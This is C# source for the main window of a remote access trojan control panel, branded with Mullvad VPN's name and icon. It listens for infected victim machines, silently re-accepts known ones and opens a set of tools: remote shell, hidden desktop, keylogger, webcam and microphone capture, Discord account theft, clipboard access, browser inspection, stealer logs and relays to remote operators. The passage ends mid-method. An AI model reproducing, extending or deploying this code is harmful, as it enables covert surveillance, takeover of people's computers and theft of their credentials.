using System.Runtime.InteropServices;
using System.Text.Json;
using mullvad.Database;
using mullvad.Forms;
using mullvad.Models;
using mullvad.Modules;
using mullvad.Network;
using mullvad.Protocol;
using mullvad.Theme;

namespace mullvad
{
    public partial class Form1 : Form
    {
        private const string ResPrefix = "mullvad.Resources.icons.";

        private static string BuildConfig =>
#if ALPHA
            "Alpha";
#elif BUILD_DEBUG
            "Debug";
#elif BUILD_RELEASE
            "Release";
#else
            "Unknown";
#endif

        private readonly List<string[]>                    _allConnections   = new();
        private readonly List<TcpServer>                   _servers          = new();
        private readonly Dictionary<string, ListViewItem>  _clientItems      = new(); // side panel (purgatory)
        private readonly Dictionary<string, ListViewItem>  _connectionItems  = new(); // main connections panel
        private readonly Dictionary<string, ClientHandler> _clientHandlers   = new();
        private readonly HashSet<string>                   _acceptedComputers = new(StringComparer.OrdinalIgnoreCase);
        // Debounce disconnect toasts: rapid drop/reconnect within grace period suppresses the notification
        private readonly Dictionary<string, CancellationTokenSource> _pendingDisconnects = new();

        private Image?                           _computerImg;
        private readonly Dictionary<string, Image> _flags = new();

        private readonly IReadOnlyList<int> _ports;
        private bool _autoAccept;
        private bool _autoDecline;

        private VpsHostServer?    _vpsHost;
        private VpsOperatorClient? _vpsOp;

        public Form1(IReadOnlyList<int> ports)
        {
            _ports = ports;
            InitializeComponent();
            LoadImages();
            var iconStream = System.Reflection.Assembly.GetExecutingAssembly()
                .GetManifestResourceStream(ResPrefix + "mullvad-vpn.ico");
            if (iconStream != null) try { Icon = new Icon(iconStream); } catch { }
        }

        protected override void OnShown(EventArgs e)
        {
            base.OnShown(e);
            SyncSearchWidth();
            splitContainerMain.SplitterMoved += (s, _) => SyncSearchWidth();
            listViewConnections.Resize += (_, _) => RefreshMole();
            LoadSideListBackground();
        }

        private Bitmap? _moleBitmap;

        private void LoadSideListBackground()
        {
            try
            {
                if (!ThemeManager.ShowMole)
                {
                    ClearMoleBackground();
                    return;
                }

                if (_moleBitmap == null)
                {
                    var asm = System.Reflection.Assembly.GetExecutingAssembly();
                    using var stream = asm.GetManifestResourceStream(ResPrefix + "mullvad-image.png");
                    if (stream == null) return;

                    using var src = Image.FromStream(stream);
                    int mw = src.Width  * 45 / 100;
                    int mh = src.Height * 45 / 100;
                    var mole = new Bitmap(mw, mh, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                    using (var g = Graphics.FromImage(mole))
                    {
                        g.Clear(Color.Transparent);
                        g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                        g.DrawImage(src, 0, 0, mw, mh);
                    }
                    _moleBitmap = mole;
                }

                void SetBg()
                {
                    if (_moleBitmap == null) return;
                    if (!ThemeManager.ShowMole) { ClearMoleBackground(); return; }
                    int cw = listViewConnections.ClientSize.Width;
                    int ch = listViewConnections.ClientSize.Height;
                    if (cw <= 0 || ch <= 0) return;

                    int mw = _moleBitmap.Width;
                    int mh = _moleBitmap.Height;
                    var canvas = new Bitmap(cw, ch, System.Drawing.Imaging.PixelFormat.Format32bppRgb);
                    using (var g = Graphics.FromImage(canvas))
                    {
                        g.Clear(Color.White);
                        g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                        g.DrawImage(_moleBitmap, -15, ch - mh - 60, mw, mh);
                    }
                    var old = listViewConnections.BackgroundImage;
                    listViewConnections.BackgroundImage      = canvas;
                    listViewConnections.BackgroundImageTiled = false;
                    old?.Dispose();
                }

                SetBg();
            }
            catch { }
        }

        private void ClearMoleBackground()
        {
            var old = listViewConnections.BackgroundImage;
            listViewConnections.BackgroundImage = null;
            old?.Dispose();
        }

        private void RefreshMole()
        {
            if (IsDisposed) return;
            if (InvokeRequired) { BeginInvoke(RefreshMole); return; }
            if (ThemeManager.ShowMole)
                LoadSideListBackground();
            else
                ClearMoleBackground();
        }


        // ── Images ───────────────────────────────────────────────────────────

        private static Image? LoadEmbedded(string resourceName)
        {
            var asm = System.Reflection.Assembly.GetExecutingAssembly();
            using var stream = asm.GetManifestResourceStream(resourceName);
            if (stream is null) return null;
            return Image.FromStream(new MemoryStream(new BinaryReader(stream).ReadBytes((int)stream.Length)));
        }

        private void LoadImages()
        {
            _computerImg = LoadEmbedded(ResPrefix + "computer.png");

            var asm = System.Reflection.Assembly.GetExecutingAssembly();
            var flagPrefix = ResPrefix + "flags.";
            foreach (var name in asm.GetManifestResourceNames())
            {
                if (!name.StartsWith(flagPrefix, StringComparison.OrdinalIgnoreCase)) continue;
                var key = name[flagPrefix.Length..].Replace(".png", "", StringComparison.OrdinalIgnoreCase).ToLower();
                try
                {
                    using var stream = asm.GetManifestResourceStream(name)!;
                    var ms = new MemoryStream(new BinaryReader(stream).ReadBytes((int)stream.Length));
                    _flags[key] = Image.FromStream(ms);
                }
                catch { }
            }

            // Keep ImageLists populated so ListView row height is correct
            if (_computerImg is not null)
            {
                imgListSide.Images.Add("computer", _computerImg);
                imgListMain.Images.Add("computer", _computerImg);
            }
            foreach (var kv in _flags)
            {
                imgListSide.Images.Add(kv.Key, kv.Value);
                imgListMain.Images.Add(kv.Key, kv.Value);
            }
        }

        private Image? GetFlag(string country)
        {
            _flags.TryGetValue(country.ToLower(), out var img);
            return img;
        }

        // ── OwnerDraw handlers ───────────────────────────────────────────────

        // Left panel: col0=flag, col1=computer icon + name, col2=username
        // Placeholder: the right-side mirror ListView was replaced by the
        // details panel. Leave the entry point so scattered call sites still compile.
        private void SyncSideMirror() { }

        private void DrawSubItemSide(object? sender, DrawListViewSubItemEventArgs e)
        {
            var lv = (ListView)sender!;
            DrawRowBackground(e.Graphics, e.Bounds, e.Item.Selected && lv.Focused);
            var fg = (e.Item.Selected && lv.Focused) ? SystemColors.HighlightText : lv.ForeColor;

            switch (e.ColumnIndex)
            {
                case 0:
                    DrawCenteredImage(e.Graphics, GetFlag(e.Item.ImageKey), e.Bounds);
                    break;
                case 1:
                    DrawIconAndText(e.Graphics, _computerImg, e.SubItem!.Text, lv.Font, fg, e.Bounds);
                    break;
                default:
                    DrawText(e.Graphics, e.SubItem!.Text, lv.Font, fg, e.Bounds);
                    break;
            }
        }

        // Main connections panel: col0=flag+country, col1=computer icon+name, rest=text
        private void DrawSubItemMain(object? sender, DrawListViewSubItemEventArgs e)
        {
            var lv = (ListView)sender!;
            DrawRowBackground(e.Graphics, e.Bounds, e.Item.Selected && lv.Focused);
            var fg = (e.Item.Selected && lv.Focused) ? SystemColors.HighlightText : lv.ForeColor;

            switch (e.ColumnIndex)
            {
                case 0:
                    DrawIconAndText(e.Graphics, GetFlag(e.Item.ImageKey), e.Item.Text, lv.Font, fg, e.Bounds, 12);
                    break;
                case 1:
                    DrawIconAndText(e.Graphics, _computerImg, e.SubItem!.Text, lv.Font, fg, e.Bounds);
                    break;
                default:
                    DrawText(e.Graphics, e.SubItem!.Text, lv.Font, fg, e.Bounds);
                    break;
            }
        }

        // ── Draw helpers ─────────────────────────────────────────────────────

        private static void DrawRowBackground(Graphics g, Rectangle bounds, bool selected)
        {
            var bg = selected ? SystemColors.Highlight : ThemeManager.ControlColor;
            using var brush = new SolidBrush(bg);
            g.FillRectangle(brush, bounds);
        }

        private static void DrawCenteredImage(Graphics g, Image? img, Rectangle bounds, int maxW = 15)
        {
            if (img is null) return;
            int iw = Math.Min(maxW, bounds.Width - 2);
            int ih = (int)(iw * (double)img.Height / img.Width);
            int x  = bounds.X + (bounds.Width  - iw) / 2;
            int y  = bounds.Y + (bounds.Height - ih) / 2;
            g.DrawImage(img, x, y, iw, ih);
        }

        private static void DrawIconAndText(Graphics g, Image? icon, string text, Font font, Color fg, Rectangle bounds, int iconMaxH = 16)
        {
            int x = bounds.X + 3;

            if (icon is not null)
            {
                int ih = Math.Min(iconMaxH, bounds.Height - 2);
                int iw = (int)(ih * (double)icon.Width / icon.Height);
                int iy = bounds.Y + (bounds.Height - ih) / 2;
                g.DrawImage(icon, x, iy, iw, ih);
                x += iw + 4;
            }

            TextRenderer.DrawText(g, text, font,
                new Rectangle(x, bounds.Y, bounds.Right - x - 2, bounds.Height),
                fg, TextFormatFlags.Left | TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis);
        }

        private static void DrawText(Graphics g, string text, Font font, Color fg, Rectangle bounds)
        {
            var r = Rectangle.Inflate(bounds, -3, 0);
            TextRenderer.DrawText(g, text, font, r, fg,
                TextFormatFlags.Left | TextFormatFlags.VerticalCenter | TextFormatFlags.EndEllipsis);
        }

        // ── Server ───────────────────────────────────────────────────────────

        private void StartServer()
        {
            var failed = new List<string>();

            foreach (var port in _ports)
            {
                var server = new TcpServer(port);
                server.ClientConnected    += OnClientConnected;
                server.ClientDisconnected += OnClientDisconnected;
                server.ClientHandshake    += OnClientHandshake;
                server.Error              += OnServerError;

                try
                {
                    server.Start();
                    _servers.Add(server);
                }
                catch (Exception ex)
                {
                    failed.Add($"Port {port}: {ex.Message}");
                    server.Stop();
                }
            }

            if (_servers.Count == 0)
            {
                var msg = "Failed to start any listeners:\n" + string.Join("\n", failed);
                SetStatus("No listeners started.");
                MessageBox.Show(msg, "Server Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            var ports = string.Join(", ", _servers.Select(s => s.Port));
            SetStatus($"Listening on port(s) {ports}  |  0 clients");

            if (failed.Count > 0)
                MessageBox.Show("Some ports failed to start:\n" + string.Join("\n", failed),
                    "Partial Start", MessageBoxButtons.OK, MessageBoxIcon.Warning);

        }

        private void OnClientConnected(ClientHandler handler)
        {
            _vpsHost?.RegisterClient(handler);  // relay to any connected VPS operators

            if (IsDisposed) return;
            this.BeginInvoke(() =>
            {
                // Create item but don't add to purgatory yet —
                // wait for OnClientHandshake so we know the computer name and
                // can skip purgatory for previously-accepted machines.
                var item = new ListViewItem("") { Tag = handler.Info.Id, ImageKey = "computer" };
                item.SubItems.Add(handler.Info.Computer);
                item.SubItems.Add(handler.Info.Username);
                _clientItems[handler.Info.Id]    = item;
                _clientHandlers[handler.Info.Id] = handler;
            });
        }

        private void OnClientHandshake(ClientHandler handler)
        {
            if (IsDisposed) return;
            this.BeginInvoke(() =>
            {
                // Duplicate computer name — disconnect the OLD handler, keep the new one.
                // Handles migration and stale TCP connections cleanly.
                if (!string.IsNullOrWhiteSpace(handler.Info.Computer))
                {
                    var stale = _clientHandlers.Values
                        .Where(h => h != handler &&
                                    string.Equals(h.Info.Computer, handler.Info.Computer,
                                                  StringComparison.OrdinalIgnoreCase))
                        .ToList();
                    foreach (var old in stale)
                        old.Disconnect();
                }

                if (_clientItems.TryGetValue(handler.Info.Id, out var item))
                {
                    item.ImageKey         = handler.Info.Country.ToLower();
                    item.Text             = "";
                    item.SubItems[1].Text = handler.Info.Computer;
                    item.SubItems[2].Text = handler.Info.Username;
                }

                // Skip purgatory for previously accepted machines — auto-accept silently
                if (!string.IsNullOrWhiteSpace(handler.Info.Computer) &&
                    _acceptedComputers.Contains(handler.Info.Computer))
                {
                    AcceptHandler(handler);
                    return;
                }

                // First-time connection — show in purgatory
                if (item != null)
                {
                    listViewSide.BeginUpdate();
                    listViewSide.Items.Add(item);
                    listViewSide.EndUpdate();
                    SyncSideMirror();
                    UpdateClientCount();
                }

                if (_autoAccept)
                    AcceptHandler(handler);
                else if (_autoDecline)
                    handler.Disconnect();
            });
        }

        private void OnClientDisconnected(ClientHandler handler)
        {
            if (IsDisposed) return;
            this.BeginInvoke(() =>
            {
                bool wasConnected = _connectionItems.ContainsKey(handler.Info.Id);

                if (_clientItems.TryGetValue(handler.Info.Id, out var sideItem))
                {
                    listViewSide.BeginUpdate();
                    listViewSide.Items.Remove(sideItem);
                    listViewSide.EndUpdate();
                    _clientItems.Remove(handler.Info.Id);
                    SyncSideMirror();
                }

                if (_connectionItems.TryGetValue(handler.Info.Id, out var mainItem))
                {
                    listViewConnections.BeginUpdate();
                    listViewConnections.Items.Remove(mainItem);
                    listViewConnections.EndUpdate();
                    _connectionItems.Remove(handler.Info.Id);
                }

                _clientHandlers.Remove(handler.Info.Id);
                UpdateClientCount();

                if (wasConnected)
                {
                    if (_keywordsPanel != null && !_keywordsPanel.IsDisposed)
                        _keywordsPanel.StopMonitoring(handler.Info.Id);

                    // Debounce: wait 5 s before toasting — rapid reconnects cancel it
                    var id = handler.Info.Id;
                    var computer = handler.Info.Computer;
                    if (_pendingDisconnects.TryGetValue(id, out var old)) { old.Cancel(); old.Dispose(); }
                    var cts = new CancellationTokenSource();
                    _pendingDisconnects[id] = cts;
                    _ = Task.Delay(5000, cts.Token).ContinueWith(t =>
                    {
                        if (t.IsCanceled || IsDisposed) return;
                        BeginInvoke(() =>
                        {
                            _pendingDisconnects.Remove(id);
                            ToastNotification.Show("Client Disconnected", $"{computer} disconnected.");
                        });
                    }, TaskScheduler.Default);
                }
            });
        }

        private void OnServerError(Exception ex)
        {
            if (IsDisposed) return;
            this.BeginInvoke(() => SetStatus($"Server error: {ex.Message}"));
        }

        private void UpdateClientCount()
        {
            var total = listViewSide.Items.Count + listViewConnections.Items.Count;
            var ports = _servers.Count > 0
                ? string.Join(", ", _servers.Select(s => s.Port))
                : "none";

            if (_vpsHost is not null)
                SetStatus($"Host ({(_vpsHost.OperatorCount > 0 ? "active" : "waiting")})  |  {total} client(s)");
            else if (_vpsOp is not null)
                SetStatus($"Host connected to {_vpsOp.RemoteAddress}  |  {total} client(s)");
            else
                SetStatus($"Listening on port(s) {ports}  |  {total} client(s)");
        }

        private void SetStatus(string text) => statusLabel.Text = text;

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            ThemeManager.Load();
            ThemeManager.ThemeChanged      += ApplyTheme;
            ThemeManager.MoleToggleChanged += RefreshMole;

            listViewSide.DrawColumnHeader        += ThemeManager.DrawColumnHeader;
            listViewConnections.DrawColumnHeader += ThemeManager.DrawColumnHeader;

            SetDoubleBuffered(listViewSide);
            SetDoubleBuffered(listViewConnections);
            listViewConnections.BackColor = Color.White;

            _activeTab = listViewConnections;
            tsConnections.Font = new Font(tsConnections.Font, FontStyle.Underline);

            ApplyTheme();
            ModuleLoader.Initialize();
            ServerDatabase.Initialize();
            StartServer();
        }

        private static void SetDoubleBuffered(Control control)
        {
            typeof(Control)
                .GetProperty("DoubleBuffered",
                    System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic)
                ?.SetValue(control, true);
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            foreach (var s in _servers) s.Stop();
            _vpsHost?.Stop();
            _vpsOp?.Disconnect();
            foreach (var cts in _pendingDisconnects.Values) { cts.Cancel(); cts.Dispose(); }
            _pendingDisconnects.Clear();
            base.OnFormClosed(e);
        }

        // ── Right-click context menu ─────────────────────────────────────────

        private ClientHandler? GetSelectedHandler()
        {
            if (listViewSide.SelectedItems.Count == 0) return null;
            var id = listViewSide.SelectedItems[0].Tag as string;
            return id is not null && _clientHandlers.TryGetValue(id, out var h) ? h : null;
        }

        private void menuAccept_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedHandler();
            if (handler is not null) AcceptHandler(handler);
        }

        private void AcceptHandler(ClientHandler handler)
        {
            var info = handler.Info;

            // Remember this machine so future reconnects skip purgatory
            if (!string.IsNullOrWhiteSpace(info.Computer))
                _acceptedComputers.Add(info.Computer);

            if (_clientItems.TryGetValue(info.Id, out var sideItem))
            {
                if (listViewSide.Items.Contains(sideItem))
                {
                    listViewSide.BeginUpdate();
                    listViewSide.Items.Remove(sideItem);
                    listViewSide.EndUpdate();
                }
                _clientItems.Remove(info.Id);
                SyncSideMirror();
            }

            var mainItem = new ListViewItem(CountryName(info.Country))
            {
                Tag      = info.Id,
                ImageKey = info.Country.ToLower(),
            };
            mainItem.SubItems.Add(info.Computer);
            mainItem.SubItems.Add(info.Os);
            mainItem.SubItems.Add(info.OsEdition);
            mainItem.SubItems.Add(info.Architecture);
            mainItem.SubItems.Add(info.Group);
            mainItem.SubItems.Add(info.InstalledAt);
            mainItem.SubItems.Add("");

            listViewConnections.BeginUpdate();
            listViewConnections.Items.Add(mainItem);
            listViewConnections.EndUpdate();
            _connectionItems[info.Id] = mainItem;

            if (tsSearch.Text?.Trim().Length > 0) ApplySearchFilter();
            UpdateClientCount();

            // Cancel any pending disconnect toast for this client (rapid reconnect)
            if (_pendingDisconnects.TryGetValue(info.Id, out var pendingCts))
            {
                pendingCts.Cancel();
                pendingCts.Dispose();
                _pendingDisconnects.Remove(info.Id);
            }
            else
            {
                ToastNotification.Show("Client Connected", $"{info.Computer} ({info.Username}) connected.");
            }

            if (_keywordsPanel != null && !_keywordsPanel.IsDisposed)
                _keywordsPanel.StartMonitoring(handler);

        }

        private void menuDecline_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedHandler();
            if (handler is null) return;

            if (MessageBox.Show(
                $"Are you sure you want to disconnect {handler.Info.Computer} ({handler.Info.Username})?\nThis will stop the running process for this connection.",
                "Decline — Are you sure?",
                MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                handler.Disconnect();
        }

        private void menuDetails_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedHandler();
            if (handler is null) return;
            var i = handler.Info;
            MessageBox.Show(
                $"Computer:     {i.Computer}\n" +
                $"Username:     {i.Username}\n" +
                $"IP Address:   {i.DisplayIp}\n" +
                $"OS:           {i.Os}\n" +
                $"OS Edition:   {i.OsEdition}\n" +
                $"Architecture: {i.Architecture}\n" +
                $"Country:      {i.Country.ToUpper()}\n" +
                $"Version:      {i.Version}\n" +
                $"Connected:    {i.ConnectedAt:yyyy-MM-dd HH:mm:ss} UTC\n" +
                $"Uptime:       {i.Uptime}",
                "Client Details", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void contextMenuSide_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            bool has = listViewSide.SelectedItems.Count > 0;
            menuAccept.Enabled  = has;
            menuDecline.Enabled = has;
            menuDetails.Enabled = has;
        }

        private void contextMenuConnections_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            // All items stay enabled — GetSelectedConnectionHandler shows dialog if nothing selected
        }

        // ── Management module handlers ────────────────────────────────────────

        private void menuRemoteShell_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;

            var bytes = ModuleLoader.GetModuleBytes("mullvad.Module.RemoteShell");
            if (bytes is null)
            {
                MessageBox.Show(
                    "The Remote Shell module was not found.\n\n" +
                    "Build the RemoteShell project so it copies to:\n" +
                    $"{ModuleLoader.ModulesDir}\\mullvad.Module.RemoteShell.enc",
                    "Module Not Found", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            var frm = new RemoteShellForm(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuRemoteScripting_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = RemoteScriptingForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuMgmtTaskMgr_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = TaskManagerForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuMgmtRegistry_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = RegistryEditorForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuMgmtServices_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;

            var bytes = ModuleLoader.GetModuleBytes("mullvad.Module.Services");
            if (bytes is null)
            {
                MessageBox.Show(
                    "The Services module was not found.\n\n" +
                    "Build the Services project so it copies to:\n" +
                    $"{ModuleLoader.ModulesDir}\\mullvad.Module.Services.enc",
                    "Module Not Found", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            var frm = ServicesManagerForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuMgmtStartup_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = StartupManagerForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuInstalledApps_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = InstalledAppsForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuRdpNormal_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = RemoteDesktopForm.CreateOrActivate(handler, h265: false);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuRdpH265_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = RemoteDesktopForm.CreateOrActivate(handler, h265: true);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuRemoteWebcam_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = RemoteWebcamForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuDesktopAudio_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = RemoteAudioForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuRemoteMic_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = RemoteMicrophoneForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuHiddenDesktop_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = HvncForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuKeylogger_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = KeyloggerForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuAppsDiscord_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = DiscordAccountForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuClipboardMgr_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = ClipboardManagerForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        // ── Information module handlers ──────────────────────────────────────

        private void menuSysInfo_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = new SystemInfoForm(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuAdvSysInfo_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = new AdvancedSystemInfoForm(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuMapNetwork_Click(object? sender, EventArgs e)
        {
            var frm = new Forms.NetworkMapForm(
                () => _clientHandlers.Values.Select(h => h.Info).ToList(),
                code => GetFlag(code),
                CountryName);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuNetInfo_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = new NetworkInfoForm(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuGeoLoc_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = GeoLocationForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuAdvGeoLoc_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = AdvancedGeoLocationForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuGpsExploit_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = GpsExploitForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        private void menuProcessMigration_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            MigrateProcessForm.ShowImmediate(this, handler);
        }

        private void menuBrowserInspection_Click(object sender, EventArgs e)
        {
            var handler = GetSelectedConnectionHandler();
            if (handler is null) return;
            var frm = BrowserInspectionForm.CreateOrActivate(handler);
            ThemeManager.ApplyForm(frm);
            frm.Show(this);
        }

        // ── Toolbar view switching ────────────────────────────────────────────

        private DatabaseViewerForm? _dbViewer;
        private ScreensPanel?       _screensPanel;
        private WebcamsPanel?       _webcamsPanel;
        private AutoTasksPanel?     _autoTasksPanel;
        private PortManagerPanel?   _portManagerPanel;
        private StealerLogsPanel?   _stealerLogsPanel;
        private KeywordsPanel?      _keywordsPanel;

        private Control? _activeTab;

        private void ShowTab(Control tab)
        {
            if (_activeTab == tab) return;
            if (_activeTab != null) _activeTab.Visible = false;
            _activeTab = tab;
            tab.Visible = true;
            // refresh underline on tab buttons
            foreach (ToolStripButton b in new[] { tsConnections, tsDatabase, tsScreens, tsWebcams, tsAutoTask, tsPortConfig, tsKeywords, tsStealer })
                b.Font = new Font(b.Font, FontStyle.Regular);
        }

        private void tsConnections_Click(object sender, EventArgs e)
        {
            ShowTab(listViewConnections);
            tsConnections.Font = new Font(tsConnections.Font, FontStyle.Underline);
        }

        private void tsDatabase_Click(object sender, EventArgs e)
        {
            EnsureDbViewerCreated();
            ShowTab(_dbViewer!);
            _dbViewer!.Refresh();
            tsDatabase.Font = new Font(tsDatabase.Font, FontStyle.Underline);
        }

        private void tsScreens_Click(object sender, EventArgs e)
        {
            EnsureScreensPanelCreated();
            ShowTab(_screensPanel!);
            tsScreens.Font = new Font(tsScreens.Font, FontStyle.Underline);
        }

        private void tsWebcams_Click(object sender, EventArgs e)
        {
            EnsureWebcamsPanelCreated();
            ShowTab(_webcamsPanel!);
            tsWebcams.Font = new Font(tsWebcams.Font, FontStyle.Underline);
        }

        private void tsAutoTask_Click(object sender, EventArgs e)
        {
            EnsureAutoTasksPanelCreated();
            ShowTab(_autoTasksPanel!);
            _autoTasksPanel!.RefreshClientList();
            tsAutoTask.Font = new Font(tsAutoTask.Font, FontStyle.Underline);
        }

        private void tsPortConfig_Click(object sender, EventArgs e)
        {
            EnsurePortManagerPanelCreated();
            ShowTab(_portManagerPanel!);
            _portManagerPanel!.Refresh();
            tsPortConfig.Font = new Font(tsPortConfig.Font, FontStyle.Underline);
        }

        private void tsKeywords_Click(object sender, EventArgs e)
        {
            EnsureKeywordsPanelCreated();
            ShowTab(_keywordsPanel!);
            tsKeywords.Font = new Font(tsKeywords.Font, FontStyle.Underline);
        }

        private void tsStealer_Click(object sender, EventArgs e)
        {
            EnsureStealerLogsPanelCreated();
            ShowTab(_stealerLogsPanel!);
            tsStealer.Font = new Font(tsStealer.Font, FontStyle.Underline);
        }

        private void EnsureDbViewerCreated()
        {
            if (_dbViewer != null && !_dbViewer.IsDisposed) return;
            _dbViewer = new DatabaseViewerForm();
            _dbViewer.TopLevel        = false;
            _dbViewer.FormBorderStyle = FormBorderStyle.None;
            _dbViewer.Dock            = DockStyle.Fill;
            _dbViewer.Visible         = false;
            panelRight.Controls.Add(_dbViewer);
            _dbViewer.Show();
            ThemeManager.ApplyForm(_dbViewer);
        }

        private void EnsureScreensPanelCreated()
        {
            if (_screensPanel != null && !_screensPanel.IsDisposed) return;
            _screensPanel = new ScreensPanel(_clientHandlers, _allConnections);
            _screensPanel.TopLevel        = false;
            _screensPanel.FormBorderStyle = FormBorderStyle.None;
            _screensPanel.Dock            = DockStyle.Fill;
            _screensPanel.Visible         = false;
            panelRight.Controls.Add(_screensPanel);
            _screensPanel.Show();
            _screensPanel.ClientDoubleClicked += id =>
            {
                // Switch to connections tab and select the client
                tsConnections_Click(null!, EventArgs.Empty);
                foreach (ListViewItem item in listViewConnections.Items)
                    if (item.Tag as string == id) { item.Selected = true; listViewConnections.EnsureVisible(item.Index); break; }
            };
            _screensPanel.ClientRightClicked += (id, pt) =>
            {
                foreach (ListViewItem item in listViewConnections.Items)
                    if (item.Tag as string == id) { item.Selected = true; break; }
                contextMenuConnections.Show(panelRight, pt);
            };
            ThemeManager.ApplyForm(_screensPanel);
        }

        private void EnsureWebcamsPanelCreated()
        {
            if (_webcamsPanel != null && !_webcamsPanel.IsDisposed) return;
            _webcamsPanel = new WebcamsPanel(_clientHandlers);
            _webcamsPanel.TopLevel        = false;
            _webcamsPanel.FormBorderStyle = FormBorderStyle.None;
            _webcamsPanel.Dock            = DockStyle.Fill;
            _webcamsPanel.Visible         = false;
            panelRight.Controls.Add(_webcamsPanel);
            _webcamsPanel.Show();
            ThemeManager.ApplyForm(_webcamsPanel);
        }

        private void EnsureAutoTasksPanelCreated()
        {
            if (_autoTasksPanel != null && !_autoTasksPanel.IsDisposed) return;
            _autoTasksPanel = new AutoTasksPanel(_clientHandlers);
            _autoTasksPanel.TopLevel        = false;
            _autoTasksPanel.FormBorderStyle = FormBorderStyle.None;
            _autoTasksPanel.Dock            = DockStyle.Fill;
            _autoTasksPanel.Visible         = false;
            panelRight.Controls.Add(_autoTasksPanel);
            _autoTasksPanel.Show();
            ThemeManager.ApplyForm(_autoTasksPanel);
        }

        private void EnsurePortManagerPanelCreated()
        {
